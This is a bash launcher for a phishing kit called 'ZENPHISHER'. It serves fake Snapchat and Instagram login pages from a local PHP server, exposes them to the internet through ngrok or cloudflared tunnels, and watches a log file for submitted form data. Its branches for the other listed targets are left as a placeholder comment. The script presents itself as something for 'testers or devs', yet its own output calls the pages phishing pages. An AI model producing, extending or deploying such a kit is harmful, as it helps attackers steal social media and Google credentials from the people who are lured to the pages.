#!/bin/bash

clear
echo -e "\e[1;32m===================================="
echo -e "      ZENPHISHER - by YOU 😈        "
echo -e "===================================="
echo -e "\n\e[1;34mChoose a target to deploy:"

echo -e "1) Snapchat \e[1;33m(crypto design)"
echo -e "2) Instagram \e[1;33m(crypto design)"
echo -e "3) Facebook \e[1;33m(crypto design)"
echo -e "4) Twitter \e[1;33m(crypto design)"
echo -e "5) Google \e[1;33m(crypto design)"
echo -e "6) Advanced Settings"
echo -e "7) Exit\n"

read -p "Option: " opt

# --- Get current timestamp, timezone, and IP geolocation ---
timestamp=$(date "+%Y-%m-%d %H:%M:%S")
timezone=$(date +'%Z%z')  # Get the local timezone of the machine
ip_address=$(curl -s ifconfig.me)  # Getting the public IP address
geolocation=$(curl -s "http://ip-api.com/json/$ip_address" | jq -r '"City: " + .city + ", Country: " + .country')  # Using ip-api to get geolocation

# --- Log the information to log.txt ---
log_file="log.txt"
echo -e "\n[Timestamp: $timestamp] - Target: $opt" >> $log_file
echo -e "IP Address: $ip_address" >> $log_file
echo -e "Geolocation: $geolocation" >> $log_file
echo -e "Timezone: $timezone" >> $log_file
echo -e "Device Info: $(uname -a)\n" >> $log_file

# --- Handle different user choices ---
case $opt in
  1)
    echo -e "\e[1;32mStarting Snapchat phishing page..."
    cd sites/Snapchat
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &

    sleep 2

    # Randomly choose between ngrok or cloudflared
    RANDOM_METHOD=$((RANDOM % 2))
    PUBLIC_URL=""

    if [ $RANDOM_METHOD -eq 0 ] && command -v ngrok &> /dev/null; then
      echo -e "\e[1;34mUsing ngrok to expose local server...\e[0m"
      ngrok http 8080 > /dev/null &
      sleep 4
      PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    elif command -v cloudflared &> /dev/null; then
      echo -e "\e[1;34mUsing cloudflared to expose local server...\e[0m"
      PUBLIC_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
    else
      echo "❌ Neither ngrok nor cloudflared is installed."
      kill $SERVER_PID
      exit 1
    fi

    # Show public URL
    if [ -n "$PUBLIC_URL" ]; then
      echo -e "\n\e[1;32mPublic URL:\e[0m $PUBLIC_URL"
      echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
    else
      echo -e "\n❌ Failed to retrieve public URL"
    fi

    # Tail log file in real-time
    echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
    tail -f log.txt
    ;;
  
  2)
    echo -e "\e[1;32mStarting Instagram phishing page..."
    cd sites/Instagram
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &

    sleep 2

    # Randomly choose between ngrok or cloudflared
    RANDOM_METHOD=$((RANDOM % 2))
    PUBLIC_URL=""

    if [ $RANDOM_METHOD -eq 0 ] && command -v ngrok &> /dev/null; then
      echo -e "\e[1;34mUsing ngrok to expose local server...\e[0m"
      ngrok http 8080 > /dev/null &
      sleep 4
      PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    elif command -v cloudflared &> /dev/null; then
      echo -e "\e[1;34mUsing cloudflared to expose local server...\e[0m"
      PUBLIC_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
    else
      echo "❌ Neither ngrok nor cloudflared is installed."
      kill $SERVER_PID
      exit 1
    fi

    # Show public URL
    if [ -n "$PUBLIC_URL" ]; then
      echo -e "\n\e[1;32mPublic URL:\e[0m $PUBLIC_URL"
      echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
    else
      echo -e "\n❌ Failed to retrieve public URL"
    fi

    # Tail log file in real-time
    echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
    tail -f log.txt
    ;;
  
  # (Continue for other options...)
  
  *)
    echo -e "\e[1;31mInvalid Option! Please select a valid option.\e[0m"
    exec $0
    ;;
esac
